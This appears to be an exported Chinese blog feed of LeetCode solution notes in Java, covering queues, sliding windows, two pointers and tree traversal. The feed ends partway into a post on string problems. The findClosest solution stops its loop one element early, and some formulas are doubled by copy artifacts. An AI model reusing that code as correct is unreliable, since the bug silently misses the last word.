<p>共有 n 名小伙伴一起做游戏。小伙伴们围成一圈，按 顺时针顺序 从 1 到 n 编号。确切地说，从第 i 名小伙伴顺时针移动一位会到达第 (i+1) 名小伙伴的位置，其中 1 &lt;&#x3D; i &lt; n ，从第 n 名小伙伴顺时针移动一位会回到第 1 名小伙伴的位置。</p>
<p>游戏遵循如下规则：</p>
<p>从第 1 名小伙伴所在位置 开始 。<br>沿着顺时针方向数 k 名小伙伴，计数时需要 包含 起始时的那位小伙伴。逐个绕圈进行计数，一些小伙伴可能会被数过不止一次。<br>你数到的最后一名小伙伴需要离开圈子，并视作输掉游戏。<br>如果圈子中仍然有不止一名小伙伴，从刚刚输掉的小伙伴的 顺时针下一位 小伙伴 开始，回到步骤 2 继续执行。<br>否则，圈子中最后一名小伙伴赢得游戏。<br>给你参与游戏的小伙伴总数 n ，和一个整数 k ，返回游戏的获胜者。</p>
</blockquote>
<h2 id="思路1：队列-模拟"><a href="#思路1：队列-模拟" class="headerlink" title="思路1：队列+模拟"></a>思路1：队列+模拟</h2><p>使用队列存储圈子中的小伙伴编号，初始时将 1 到 n 的所有编号依次加入队列，队首元素即为第 1 名小伙伴的编号。</p>
<p>每一轮游戏中，从当前小伙伴开始数 k 名小伙伴，数到的第 k 名小伙伴离开圈子。模拟游戏过程的做法是，将队首元素取出并将该元素在队尾处重新加入队列，重复该操作 k - 1 次，则在 k - 1次操作之后，队首元素即为这一轮中数到的第 k 名小伙伴的编号，将队首元素取出，即为数到的第 k 名小伙伴离开圈子。上述操作之后，新的队首元素即为下一轮游戏的起始小伙伴的编号。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTheWinner</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Queue&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> ; i &lt;= n ; i++)&#123;</span><br><span class="line">            queue.offer(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(queue.size() &gt; <span class="number">1</span> )&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span> ; i &lt; k ; i++)&#123;</span><br><span class="line">                queue.offer(queue.poll());</span><br><span class="line">            &#125;</span><br><span class="line">            queue.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queue.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>执行用时：24 ms, 在所有 Java 提交中击败了24.43%的用户</li>
<li>内存消耗：38.6 MB, 在所有 Java 提交中击败了33.60%的用户</li>
<li>通过测试用例：95 &#x2F; 95</li>
</ul>
<h1 id="713-乘积小于-K-的子数组"><a href="#713-乘积小于-K-的子数组" class="headerlink" title="713. 乘积小于 K 的子数组"></a><a href="https://leetcode-cn.com/problems/subarray-product-less-than-k/">713. 乘积小于 K 的子数组</a></h1><blockquote>
<p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> ，请你返回子数组内所有元素的乘积严格小于 <code>k</code> 的连续子数组的数目。</p>
<p> 输入：nums &#x3D; [10,5,2,6], k &#x3D; 100<br>输出：8<br>解释：8 个乘积小于 100 的子数组分别为：[10]、[5]、[2],、[6]、[10,5]、[5,2]、[2,6]、[5,2,6]。<br>需要注意的是 [10,5,2] 并不是乘积小于 100 的子数组。</p>
</blockquote>
<h2 id="思路：滑动窗口"><a href="#思路：滑动窗口" class="headerlink" title="思路：滑动窗口"></a>思路：滑动窗口</h2><p>一个简单的滑动窗口应用题目</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numSubarrayProductLessThanK</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length , ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(k &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ,j = <span class="number">0</span> ,cur = <span class="number">1</span> ; i &lt; len ; i++)&#123;</span><br><span class="line">            cur *= nums[i];</span><br><span class="line">            <span class="keyword">while</span>(cur &gt;= k)&#123;</span><br><span class="line">                cur /= nums[j++];</span><br><span class="line">            &#125;</span><br><span class="line">            ans += i - j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：4 ms, 在所有 Java 提交中击败了99.95%的用户</li>
<li>内存消耗：48 MB, 在所有 Java 提交中击败了35.07%的用户</li>
<li>通过测试用例：97 &#x2F; 97</li>
</ul>
<h1 id="933-最近的请求次数"><a href="#933-最近的请求次数" class="headerlink" title="933. 最近的请求次数"></a><a href="https://leetcode-cn.com/problems/number-of-recent-calls/">933. 最近的请求次数</a></h1><blockquote>
<p>写一个 RecentCounter 类来计算特定时间范围内最近的请求。</p>
<p>请你实现 RecentCounter 类：</p>
<p>RecentCounter() 初始化计数器，请求数为 0 。<br>int ping(int t) 在时间 t 添加一个新请求，其中 t 表示以毫秒为单位的某个时间，并返回过去 3000 毫秒内发生的所有请求数（包括新请求）。确切地说，返回在 [t-3000, t] 内发生的请求数。<br>保证 每次对 ping 的调用都使用比之前更大的 t 值。</p>
<p>输入：<br>[“RecentCounter”, “ping”, “ping”, “ping”, “ping”]<br>[[], [1], [100], [3001], [3002]]<br>输出：<br>[null, 1, 2, 3, 3]</p>
<p>解释：<br>RecentCounter recentCounter &#x3D; new RecentCounter();<br>recentCounter.ping(1);     &#x2F;&#x2F; requests &#x3D; [1]，范围是 [-2999,1]，返回 1<br>recentCounter.ping(100);   &#x2F;&#x2F; requests &#x3D; [1, 100]，范围是 [-2900,100]，返回 2<br>recentCounter.ping(3001);  &#x2F;&#x2F; requests &#x3D; [1, 100, 3001]，范围是 [1,3001]，返回 3<br>recentCounter.ping(3002);  &#x2F;&#x2F; requests &#x3D; [1, 100, 3001, 3002]，范围是 [2,3002]，返回 3</p>
</blockquote>
<h2 id="思路：队列"><a href="#思路：队列" class="headerlink" title="思路：队列"></a>思路：队列</h2><p>我们可以用一个队列维护发生请求的时间，当在时间 tt 收到请求时，将时间 tt 入队。</p>
<p>由于每次收到的请求的时间都比之前的大，因此从队首到队尾的时间值是单调递增的。当在时间 tt 收到请求时，为了求出 [t-3000,t][t−3000,t] 内发生的请求数，我们可以不断从队首弹出早于 t-3000 的时间。循环结束后队列的长度就是 [t-3000,t][t−3000,t] 内发生的请求数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RecentCounter</span> &#123;</span><br><span class="line">    Queue&lt;Integer&gt; queue ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RecentCounter</span><span class="params">()</span> &#123;</span><br><span class="line">        queue = <span class="keyword">new</span>  <span class="title class_">ArrayDeque</span>&lt;Integer&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">ping</span><span class="params">(<span class="type">int</span> t)</span> &#123;</span><br><span class="line">        queue.offer(t);</span><br><span class="line">        <span class="keyword">while</span>(queue.peek() &lt; t-<span class="number">3000</span>)&#123;</span><br><span class="line">            queue.poll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> queue.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：24 ms, 在所有 Java 提交中击败了20.16%的用户</li>
<li>内存消耗：49.1 MB, 在所有 Java 提交中击败了87.08%的用户</li>
<li>通过测试用例：68 &#x2F; 68</li>
</ul>
<h1 id="942-增减字符串匹配"><a href="#942-增减字符串匹配" class="headerlink" title="942. 增减字符串匹配"></a><a href="https://leetcode.cn/problems/di-string-match/">942. 增减字符串匹配</a></h1><blockquote>
<p>由范围 [0,n] 内所有整数组成的 n + 1 个整数的排列序列可以表示为长度为 n 的字符串 s ，其中:</p>
<p>如果 perm[i] &lt; perm[i + 1] ，那么 s[i] &#x3D;&#x3D; ‘I’<br>如果 perm[i] &gt; perm[i + 1] ，那么 s[i] &#x3D;&#x3D; ‘D’<br>给定一个字符串 s ，重构排列 perm 并返回它。如果有多个有效排列perm，则返回其中 任何一个 。</p>
<p>示例 1：</p>
<p>输入：s &#x3D; “IDID”<br>输出：[0,4,1,3,2]</p>
</blockquote>
<h2 id="思路：贪心-双指针"><a href="#思路：贪心-双指针" class="headerlink" title="思路：贪心+双指针"></a>思路：贪心+双指针</h2><p>该做法成立的本质为：<strong>始终确保可用数是连续段，每次选择位于边界的数进行构造，可以直接确保当前构造回合的正确性，从而让边界情况的归纳推理可以运用到每个构造回合。</strong></p>
<p>考虑 \textit{perm}[0]perm[0] 的值，根据题意：</p>
<ul>
<li><p>如果 s[0]&#x3D;‘I’，那么令perm[0]&#x3D;0，则无论 perm[1] 为何值都满足 perm[0]&lt;perm[1]；</p>
</li>
<li><p>如果s[0]&#x3D;‘D’，那么令 perm[0]&#x3D;n，则无论perm[1] 为何值都满足 perm[0]&gt;perm[1]；</p>
</li>
</ul>
<p>确定好perm[0] 后，剩余的 n−1 个字符和 n个待确定的数就变成了一个和原问题相同，但规模为 n−1 的问题。因此我们可以继续按照上述方法确定 perm[1]：如果s[1]&#x3D;‘I’，那么令 perm[1] 为剩余数字中的最小数；如果 s[1]&#x3D;‘D’，那么令 perm[1] 为剩余数字中的最大数。如此循环直至剩下一个数，填入perm[n] 中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] diStringMatch(String s) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> s.length() , left = <span class="number">0</span> , right = len;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[len+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;len ; i++)&#123;</span><br><span class="line">            ans[i] = s.charAt(i) == <span class="string">&#x27;I&#x27;</span>?left++:right--;</span><br><span class="line">        &#125;</span><br><span class="line">        ans[len] = left;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：2 ms, 在所有 Java 提交中击败了87.44%的用户,O(n)</li>
<li>内存消耗：41.9 MB, 在所有 Java 提交中击败了36.45%的用户,O(1)</li>
<li>通过测试用例：95 &#x2F; 95</li>
</ul>
<h1 id="944-删列造序"><a href="#944-删列造序" class="headerlink" title="944. 删列造序"></a><a href="https://leetcode.cn/problems/delete-columns-to-make-sorted/">944. 删列造序</a></h1><blockquote>
<p>给你由 n 个小写字母字符串组成的数组 strs，其中每个字符串长度相等。</p>
<p>这些字符串可以每个一行，排成一个网格。例如，strs &#x3D; [“abc”, “bce”, “cae”] 可以排列为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abc</span><br><span class="line">bce</span><br><span class="line">cae</span><br></pre></td></tr></table></figure>

<p>你需要找出并删除 不是按字典序升序排列的 列。在上面的例子（下标从 0 开始）中，列 0（’a’, ‘b’, ‘c’）和列 2（’c’, ‘e’, ‘e’）都是按升序排列的，而列 1（’b’, ‘c’, ‘a’）不是，所以要删除列 1 。</p>
<p>返回你需要删除的列数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：strs = [&quot;cba&quot;,&quot;daf&quot;,&quot;ghi&quot;]</span><br><span class="line">输出：1</span><br><span class="line">解释：网格示意如下：</span><br><span class="line">  cba</span><br><span class="line">  daf</span><br><span class="line">  ghi</span><br><span class="line">列 0 和列 2 按升序排列，但列 1 不是，所以只需要删除列 1 。</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：直接模拟"><a href="#思路：直接模拟" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minDeletionSize(String[] strs) &#123;</span><br><span class="line">        int row = strs.length,col = strs[0].length() ,ans = 0;</span><br><span class="line">        for(int j = 0 ; j &lt; col ; j++)&#123;</span><br><span class="line">            for(int i = 1 ; i &lt; row ; i++)&#123;</span><br><span class="line">                if(strs[i - 1].charAt(j) &gt; strs[i].charAt(j))&#123;</span><br><span class="line">                    ans++;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：O（row x col）</li>
<li>空间复杂度：O（1）</li>
</ul>
<h1 id="面试题-01-05-一次编辑"><a href="#面试题-01-05-一次编辑" class="headerlink" title="面试题 01.05. 一次编辑"></a><a href="https://leetcode.cn/problems/one-away-lcci/">面试题 01.05. 一次编辑</a></h1><blockquote>
<p>字符串有三种编辑操作:插入一个字符、删除一个字符或者替换一个字符。 给定两个字符串，编写一个函数判定它们是否只需要一次(或者零次)编辑。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: </span><br><span class="line">first = &quot;pale&quot;</span><br><span class="line">second = &quot;ple&quot;</span><br><span class="line">输出: True</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：双指针分情况模拟"><a href="#思路：双指针分情况模拟" class="headerlink" title="思路：双指针分情况模拟"></a>思路：双指针分情况模拟</h2><p>为了方便，我们令first、 second，两者长度为 n 和 m，并让 first为两种中的长度较短的那个（若 second 较短，则将两者交换）。</p>
<p>接下来是简单的双指针处理（使用 count 记录操作次数）：</p>
<ul>
<li><p>我们最多使用不超过一次的操作，因此如果∣n−m∣&gt;1，直接返回 False；</p>
</li>
<li><p>若两者长度差不超过 1，使用 i 和 j分别指向两字符的最左侧进行诸位检查：</p>
<ul>
<li><p>若 first[i] &#x3D; second[j]，让 i 和 j 继续后移进行检查；</p>
</li>
<li><p>若 first[i] !&#x3D;second[j]，根据两字符串长度进行分情况讨论：</p>
<ul>
<li><p>若 n &#x3D; m，说明此时只能通过「替换」操作消除不同，分别让 i 和 j 后移，并对 count 进行加一操作；</p>
</li>
<li><p>若 n !&#x3D;m，由于我们人为确保了 first 更短，即此时是 n &lt; m，此时只能通过对 first 字符串进行「添加」操作来消除不同，此时让 j 后移，i 不动（含义为在 first字符串中的 i 位置增加一个 b[j] 字符），并对 count 进行加一操作。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>最终我们根据 count 是否不超过 11 来返回结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">oneEditAway</span><span class="params">(String first, String second)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> first.length() , m = second.length();</span><br><span class="line">        <span class="keyword">if</span>(Math.abs(m - n )&gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(n &gt; m ) <span class="keyword">return</span> oneEditAway(second , first);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> , j = <span class="number">0</span> , count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n &amp;&amp; j &lt; m &amp;&amp; count &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(first.charAt(i) == second.charAt(j))&#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(n == m)&#123;</span><br><span class="line">                    i++;</span><br><span class="line">                    j++;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    j++;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count &lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>时间复杂度：令 n和 m 分别为两字符串长度，复杂度为 O*(max(<em>n</em>,<em>m</em>))</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="面试题-04-06-后继者"><a href="#面试题-04-06-后继者" class="headerlink" title="面试题 04.06. 后继者"></a><a href="https://leetcode.cn/problems/successor-lcci/">面试题 04.06. 后继者</a></h1><blockquote>
<p>设计一个算法，找出二叉搜索树中指定节点的“下一个”节点（也即中序后继）。</p>
<p>如果指定节点没有对应的“下一个”节点，则返回null。</p>
<p>示例 1:</p>
<p>输入: root &#x3D; [2,1,3], p &#x3D; 1</p>
<p>  2<br> &#x2F; <br>1   3</p>
<p>输出: 2</p>
</blockquote>
<h2 id="思路：二叉搜索树"><a href="#思路：二叉搜索树" class="headerlink" title="思路：二叉搜索树"></a>思路：二叉搜索树</h2><p>利用二叉树搜索的性质</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">inorderSuccessor</span><span class="params">(TreeNode root, TreeNode p)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">target</span> <span class="operator">=</span> p.val;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.val &gt; target)&#123;</span><br><span class="line">                ans = cur;</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>时间复杂度：O(n)，其中 n 是二叉搜索树的节点数。遍历的节点数不超过二叉搜索树的高度，平均情况是 O(logn)，最坏情况是O(n)。</p>
</li>
<li><p>空间复杂度：O(1)。</p>
</li>
</ul>
<h1 id="462-最少移动次数使数组元素相等-II"><a href="#462-最少移动次数使数组元素相等-II" class="headerlink" title="462. 最少移动次数使数组元素相等 II"></a><a href="https://leetcode.cn/problems/minimum-moves-to-equal-array-elements-ii/">462. 最少移动次数使数组元素相等 II</a></h1><blockquote>
<p>给你一个长度为 n 的整数数组 nums ，返回使所有数组元素相等需要的最少移动数。</p>
<p>在一步操作中，你可以使数组中的一个元素加 1 或者减 1 。</p>
<p>示例 1：</p>
<p>输入：nums &#x3D; [1,2,3]<br>输出：2<br>解释：<br>只需要两步操作（每步操作指南使一个元素加 1 或减 1）：<br>[1,2,3]  &#x3D;&gt;  [2,2,3]  &#x3D;&gt;  [2,2,2]</p>
</blockquote>
<h2 id="思路：排序"><a href="#思路：排序" class="headerlink" title="思路：排序"></a>思路：排序</h2><p>从感官上而言，将数组进行排序，位于中间的那个数肯定是离所有数的距离和最小的那个数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minMoves2</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length , ans = <span class="number">0</span> , mid = nums[len/<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; len ; i++)&#123;</span><br><span class="line">            ans += Math.abs(nums[i] - mid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="965-单值二叉树"><a href="#965-单值二叉树" class="headerlink" title="965. 单值二叉树"></a><a href="https://leetcode.cn/problems/univalued-binary-tree/">965. 单值二叉树</a></h1><blockquote>
<p>如果二叉树每个节点都具有相同的值，那么该二叉树就是<em>单值</em>二叉树。</p>
<p>只有给定的树是单值二叉树时，才返回 <code>true</code>；否则返回 <code>false</code>。</p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50104-pm.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="literal">null</span>,<span class="number">1</span>]</span><br><span class="line">输出：<span class="literal">true</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="思路：深度优先搜索-递归"><a href="#思路：深度优先搜索-递归" class="headerlink" title="思路：深度优先搜索(递归)"></a>思路：深度优先搜索(递归)</h2><p>一棵树的所有节点都有相同的值，当且仅当对于树上的每一条边的两个端点，它们都有相同的值（这样根据传递性，所有节点都有相同的值）。</p>
<p>因此，我们可以对树进行一次深度优先搜索。当搜索到节点 x 时，我们检查 x 与 x 的每一个子节点之间的边是否满足要求。例如对于左子节点而言，如果其存在并且值与 x相同，那么我们继续向下搜索该左子节点；如果值与x 不同，那么我们直接返回 \text{False}False。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isUnivalTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.left != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.val != root.left.val || !isUnivalTree(root.left))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(root.right != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(root.val != root.right.val || !isUnivalTree(root.right))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>时间复杂度：O(n)，其中 n 是二叉树的节点个数。我们遍历二叉树的每个节点至多一次。</p>
</li>
<li><p>空间复杂度：O(n)，即为深度优先搜索中需要使用的栈空间。</p>
</li>
</ul>
<h1 id="面试题-17-11-单词距离"><a href="#面试题-17-11-单词距离" class="headerlink" title="面试题 17.11. 单词距离"></a><a href="https://leetcode.cn/problems/find-closest-lcci/">面试题 17.11. 单词距离</a></h1><blockquote>
<p>有个内含单词的超大文本文件，给定任意两个不同的单词，找出在这个文件中这两个单词的最短距离(相隔单词数)。如果寻找过程在这个文件中会重复多次，而每次寻找的单词不同，你能对此优化吗?</p>
<p>示例：</p>
<p>输入：words &#x3D; [“I”,”am”,”a”,”student”,”from”,”a”,”university”,”in”,”a”,”city”], word1 &#x3D; “a”, word2 &#x3D; “student”<br>输出：1</p>
</blockquote>
<h2 id="思路：一次遍历-双指针"><a href="#思路：一次遍历-双指针" class="headerlink" title="思路：一次遍历+双指针"></a>思路：一次遍历+双指针</h2><p>用 index 1和index 2分别表示数组 words 已经遍历的单词中的最后一个word 1的下标和最后一个 word2的下标，初始时 index1 &#x3D; index2 &#x3D; -1。遍历数组 words，当遇到 word1或 word 2时，执行如下操作</p>
<ul>
<li>如果遇到word1，则将index1更新为当前下标；如果遇到word2，则将index2更新为当前下标。</li>
<li>如果index1和index2都为非负，则计算两个下标的距离，并用该距离更新最短距离</li>
</ul>
<p>遍历结束后即可得到word1和word2的最短距离</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findClosest</span><span class="params">(String[] words, String word1, String word2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> words.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> len;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index1</span> <span class="operator">=</span> -<span class="number">1</span> , index2 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt;len-<span class="number">1</span> ; i++)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">word</span> <span class="operator">=</span> words[i];</span><br><span class="line">            <span class="keyword">if</span>(word.equals(word1))&#123;</span><br><span class="line">                index1 = i;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(word.equals(word2))&#123;</span><br><span class="line">                index2 = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(index1 &gt;= <span class="number">0</span> &amp;&amp; index2 &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                ans = Math.min(ans,Math.abs(index1 - index2));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>每日一题</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode——字符串</title>
    <url>/2022/05/06/18-leetcode%E2%80%94%E2%80%94%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下leetcode字符串部分题目的刷题笔记，顺序参考代码随想录中，但不仅限于这些，可以扩展记录。</p>
<h1 id="344-反转字符串"><a href="#344-反转字符串" class="headerlink" title="344. 反转字符串"></a><a href="https://leetcode-cn.com/problems/reverse-string/">344. 反转字符串</a></h1><blockquote>
<p>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 s 的形式给出。</p>
<p>不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。</p>
<p><strong>示例 1：</strong></p>
